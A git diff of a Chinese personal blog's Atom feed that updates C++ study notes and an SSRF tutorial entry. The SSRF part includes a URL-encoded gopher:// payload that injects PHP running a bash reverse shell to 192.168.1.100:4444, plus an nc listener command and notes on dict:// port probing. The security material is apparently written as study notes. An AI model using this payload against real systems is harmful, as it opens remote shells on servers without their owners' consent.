@@ -8,8 +8,19 @@
     <author>
       <name>开船的</name>
     </author>
-    <updated>2025-04-06T15:02:54.000Z</updated>
+    <updated>2025-04-13T09:25:36.000Z</updated>
     <category term="《舰舰的奇妙冒险》" />
+    <entry>
+        <id>https://zhewanyiershinicheng.github.io/2025/04/13/%E6%8C%82%E4%B8%80%E4%B8%AA/</id>
+        <title>挂一个</title>
+        <link rel="alternate" href="https://zhewanyiershinicheng.github.io/2025/04/13/%E6%8C%82%E4%B8%80%E4%B8%AA/"/>
+        <content type="html">&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1744536183520.jpg&#34; alt=&#34;1744536183520&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1744536183516.jpg&#34; alt=&#34;1744536183516&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1744536183512.jpg&#34; alt=&#34;1744536183512&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="沃趣" scheme="https://zhewanyiershinicheng.github.io/tags/%E6%B2%83%E8%B6%A3/" />
+        <updated>2025-04-13T09:25:36.000Z</updated>
+    </entry>
     <entry>
         <id>https://zhewanyiershinicheng.github.io/2025/04/06/SSRF/</id>
         <title>SSRF</title>
@@ -59,6 +70,7 @@ tftp:// 简单文件传输协议&lt;br /&gt;
 语法是：
 dict://&amp;lt;server&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;database identifier&amp;gt;/&amp;lt;search query&amp;gt;
 一些服务响应dict请求会返回自身信息，所以泄露。也可以用于探测端口是否开放 (只构造到dict://&amp;lt;target_ip&amp;gt;:&amp;lt;port&amp;gt;/)。通常只是为已知漏洞做准备。
+但是似乎不能代替file读取普通文件
 
 （3）gopher：gopher支持发出GET、POST请求,可用于反弹shell
 语法是：
@@ -107,11 +119,7 @@ cmd=&amp;lt;?php system(&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.1
 &lt;li&gt;特殊字符需要进行 URL 编码。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/blockquote&gt;
-&lt;pre&gt;&lt;code&gt;#这也是在构造复杂请求，你也可以截获请求，然后篡改，或者模拟正常用户。
-转化后：
-gopher://&amp;lt;目标主机&amp;gt;:80/_POST%20/vulnerable.php%20HTTP/1.1%0D%0AHost:%20&amp;lt;目标主机&amp;gt;%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2068%0D%0A%0D%0Acmd%3D%3C%3Fphp%20system(%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%22);%3F%3E
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;然后监听下 4444 端口：&lt;/p&gt;
+&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#这也是在构造复杂请求，你也可以截获请求，然后篡改，或者模拟正常用户。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;转化后：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;gopher&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token header-value&#34;&gt;//&amp;lt;目标主机&gt;:80/_POST%20/vulnerable.php%20HTTP/1.1%0D%0AHost:%20&amp;lt;目标主机&gt;%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2068%0D%0A%0D%0Acmd%3D%3C%3Fphp%20system(%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%22);%3F%3E&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//其实就是进行两次url编码，但是第一次后要手动将%0A改成%0D%0A&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后监听下 4444 端口：&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;     //这什么玩意儿？？？&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样反向连接成功后，就可以在目标主机上执行命名（起码比一直构造好 php 好了很多）&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;gopher&lt;/code&gt;  协议攻击内网服务：&lt;/p&gt;
 </content>
@@ -187,8 +195,8 @@ gopher://&amp;lt;目标主机&amp;gt;:80/_POST%20/vulnerable.php%20HTTP/1.1%0D%0
         <id>https://zhewanyiershinicheng.github.io/2025/03/22/%E4%B8%80%E7%82%B9C-%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
         <title>一点C-的碎碎念</title>
         <link rel="alternate" href="https://zhewanyiershinicheng.github.io/2025/03/22/%E4%B8%80%E7%82%B9C-%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
-        <content type="html">&lt;p&gt;实际上是做题时遇到的一点疑惑&lt;/p&gt;
-&lt;p&gt;1. 关于 this 指针：(选 B)&lt;/p&gt;
+        <content type="html">&lt;h2 id=&#34;一点疑惑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一点疑惑&#34;&gt;#&lt;/a&gt; 一点疑惑&lt;/h2&gt;
+&lt;h3 id=&#34;1this指针选b&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1this指针选b&#34;&gt;#&lt;/a&gt; 1.this 指针 (选 B)&lt;/h3&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1742639945490.png&#34; alt=&#34;1742639945490&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;A. 构造函数用于初始化对象，在构造函数中可以使用 &lt;code&gt;this&lt;/code&gt;  指针来区分成员变量和局部变量，或者通过 &lt;code&gt;this&lt;/code&gt;  指针调用其他成员函数等。例如：&lt;/p&gt;
 &lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;MyClass&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; num&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;MyClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; num&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用于区分时必须明写 this&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;B. 此时 &lt;code&gt;this&lt;/code&gt;  指针是一个指向常量对象的指针，即 &lt;code&gt;const&lt;/code&gt;  类型的指针，不能指向可以被修改的对象&lt;/p&gt;
@@ -205,7 +213,7 @@ public:
 /*在实际使用中，const类型的成员函数依然可以使用this来指向调用它的对象，也可以访问其内容*/
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;C，D 都是正确的&lt;/p&gt;
-&lt;p&gt;2. 关于构造 / 析构函数的执行&lt;/p&gt;
+&lt;h3 id=&#34;2构造析构函数的执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2构造析构函数的执行&#34;&gt;#&lt;/a&gt; 2. 构造 / 析构函数的执行&lt;/h3&gt;
 &lt;p&gt;不放题目就说一下：&lt;/p&gt;
 &lt;p&gt;构造函数&lt;/p&gt;
 &lt;p&gt;默认就有普通构造函数和复制构造函数（是浅拷贝，仅仅赋值），它们是重载的&lt;/p&gt;
@@ -217,9 +225,9 @@ public:
 &lt;p&gt;另外，const 可以作为构造函数的重载区分，当定义的对象是 const 类型，它才会被自动调用。&lt;/p&gt;
 &lt;p&gt;析构函数&lt;/p&gt;
 &lt;p&gt;没有参数，不可重载，都是先入后出（同生存期时，包括对象数组），这是因为后面定义的对象析构时可能访问已销毁的前面的对象，所以这是 C++ 的标准要求的，跟怎么存储没有关系。还有就是，如果堆上的对象不是手动释放，在程序结束后&lt;strong&gt;不会调用析构函数&lt;/strong&gt;，而是被操作系统直接回收。&lt;/p&gt;
-&lt;p&gt;3. 关于成员函数 &amp;amp; const&amp;amp;static&lt;/p&gt;
+&lt;h3 id=&#34;3成员函数conststatic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3成员函数conststatic&#34;&gt;#&lt;/a&gt; 3. 成员函数 &amp;amp; const&amp;amp;static&lt;/h3&gt;
 &lt;p&gt;常成员函数：&lt;/p&gt;
-&lt;p&gt;属于对象，不能通过  &lt;code&gt;this&lt;/code&gt;  指针修改调用对象的非常数据成员 ，但是可以使用外部的数据 / 函数&lt;/p&gt;
+&lt;p&gt;属于对象本身，不能通过  &lt;code&gt;this&lt;/code&gt;  指针修改调用对象的非常数据成员 ，但是可以使用外部的数据 / 函数&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;并且可以修改外部数据（除 const 的数据），被调用外部函数也可以修改对象的非常数据成员&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;稍微复杂一点：&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
@@ -260,7 +268,394 @@ int main() &amp;#123;
 &lt;p&gt;提一下：&lt;/p&gt;
 &lt;p&gt;1. 静态成员数据不是在构造函数中初始化的（但是构造函数可以使用它），必须在类外以 &lt;code&gt;类名::变量名=xxx&lt;/code&gt;  的形式初始化，不过，如果它同时是 const 的话，&lt;strong&gt;甚至可以直接在类内就定义&lt;/strong&gt;（也可以不）&lt;/p&gt;
 &lt;p&gt;2. 常数据成员只能在构造函数的初始化列表中定义（除了上面那个情况），不能在函数本身或者外部&lt;/p&gt;
+&lt;p&gt;3.&lt;strong&gt;const 对象只能绑定到 const 引用&lt;/strong&gt;，但是，const 引用可以绑定非 const 对象&lt;/p&gt;
+&lt;p&gt;所以成员函数应该：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;bool operator&amp;gt;(const Complex &amp;amp;other) const&amp;#123;&amp;#125;
+//关注前一个const的作用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;否则传入 const 对象时会报错。&lt;/p&gt;
 &lt;p&gt;总之就是：static 类型的属于类本身，但是 const 属于对象，只有同时是 static 和 const 才能类内定义&lt;/p&gt;
+&lt;h3 id=&#34;4重载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4重载&#34;&gt;#&lt;/a&gt; 4. 重载&lt;/h3&gt;
+&lt;p&gt;并不是每个可重载的运算符都能以这三种方式重载。例如，赋值运算符  &lt;code&gt;=&lt;/code&gt; 、下标运算符  &lt;code&gt;[]&lt;/code&gt; 、函数调用运算符  &lt;code&gt;()&lt;/code&gt;  和成员访问运算符  &lt;code&gt;-&amp;gt;&lt;/code&gt;  只能重载为成员函数。&lt;/p&gt;
+&lt;p&gt;对于 ++ 运算符的重载，可以只重载一种形式（后置有个 int 作为占位参数）&lt;/p&gt;
+&lt;h3 id=&#34;5对象与引用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5对象与引用&#34;&gt;#&lt;/a&gt; 5. 对象与引用&lt;/h3&gt;
+&lt;p&gt;引用是对象的别名，你&lt;strong&gt;可以将对象本身当作引用传入或者传出&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;也就是说：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;CLASS fuction (CLASS&amp;amp; F)&amp;#123;...&amp;#125;
+cLASS function (CLASS F)&amp;#123;...&amp;#125;
+都可以用；
+CLASS a,b;
+b=function(a);
+来调用，不需要用CLASS &amp;amp;c=a;b=function(c);这样的表达。
+只是前者会达到类似指针的效果，后者单纯传值（这里俩不能重载）
+同理：
+CLASS function(...)&amp;#123;...&amp;#125;
+CLASS &amp;amp;fuction(...)&amp;#123;...&amp;#125;
+都可以用：
+return *this;
+来返回
+前者返回的是副本，需要存在复制构造函数，如果后续是连续操作，会在副本上操作
+造成不能连续使用，而前者返回还是原对象的应用，尽管看着还是返回对象（这也就是为什么重载输入输出流时必须是返回引用）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;各种库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#各种库&#34;&gt;#&lt;/a&gt; 各种库&lt;/h2&gt;
+&lt;h3 id=&#34;iostream-iomanip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iostream-iomanip&#34;&gt;#&lt;/a&gt; &amp;lt;iostream&amp;gt;&amp;amp; &amp;lt;iomanip&amp;gt;&lt;/h3&gt;
+&lt;p&gt;主要类&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;std::istream&lt;/code&gt; ：用于输入操作的抽象基类。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;std::ostream&lt;/code&gt; ：用于输出操作的抽象基类。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;std::iostream&lt;/code&gt; ：继承自 &lt;code&gt;std::istream&lt;/code&gt;  和 &lt;code&gt;std::ostream&lt;/code&gt; ，用于同时进行输入和输出操作。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;std::cin&lt;/code&gt; ：标准输入流对象，通常与键盘关联。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;std::cout&lt;/code&gt; ：标准输出流对象，通常与屏幕关联。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;std::cerr&lt;/code&gt; ：标准错误输出流对象，不带缓冲，通常与屏幕关联。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;std::clog&lt;/code&gt; ：标准日志流对象，带缓冲，通常与屏幕关联&lt;/li&gt;
+&lt;/ul&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;函数 / 操纵符&lt;/strong&gt;&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;功能&lt;/strong&gt;&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;实例代码&lt;/strong&gt;&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;输出结果&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::setw(int n)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置字段宽度，为&lt;strong&gt;下一次&lt;/strong&gt;输出指定宽度&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::setw(5) &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::setfill(char)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置填充字符（默认是空格）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::setfill(&#39;*&#39;) &amp;lt;&amp;lt; std::setw(5) &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;***42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::left&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置左对齐&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::left &amp;lt;&amp;lt; std::setw(5) &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::right&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置右对齐&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::right &amp;lt;&amp;lt; std::setw(5) &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::internal&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;符号靠左，其余靠右&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::internal &amp;lt;&amp;lt; std::setw(5) &amp;lt;&amp;lt; -42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;- 42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::setprecision(int)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置浮点数的有效位数&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::setprecision(3) &amp;lt;&amp;lt; 3.14159;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;3.14&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::fixed&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置定点格式输出浮点数&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::fixed &amp;lt;&amp;lt; std::setprecision(2) &amp;lt;&amp;lt; 3.14159;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;3.14&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::scientific&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置科学计数法格式输出浮点数&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::scientific &amp;lt;&amp;lt; 3.14159;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;3.141590e+00&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::hex&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置整数以 16 进制显示&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::oct&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置整数以 8 进制显示&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::oct &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;52&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::dec&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置整数以 10 进制显示（默认）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::dec &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::showbase&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;显示进制前缀（如  &lt;code&gt;0x&lt;/code&gt;  表示 16 进制）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::showbase &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;0x2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::noshowbase&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;隐藏进制前缀（默认）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::noshowbase &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::uppercase&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;16 进制字母显示为大写&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::uppercase &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;2A&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::nouppercase&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;16 进制字母显示为小写（默认）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::nouppercase &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::showpos&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;在正数前显示  &lt;code&gt;+&lt;/code&gt;  符号&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::showpos &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;+42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::noshowpos&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;不显示正数的  &lt;code&gt;+&lt;/code&gt;  符号（默认）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::noshowpos &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;42&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::boolalpha&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;布尔值以  &lt;code&gt;true/false&lt;/code&gt;  输出&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::boolalpha &amp;lt;&amp;lt; true;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::noboolalpha&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;布尔值以  &lt;code&gt;1/0&lt;/code&gt;  输出（默认）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::noboolalpha &amp;lt;&amp;lt; true;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::setbase(int n)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置整数的进制（支持 8、10、16）&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::setbase(16) &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
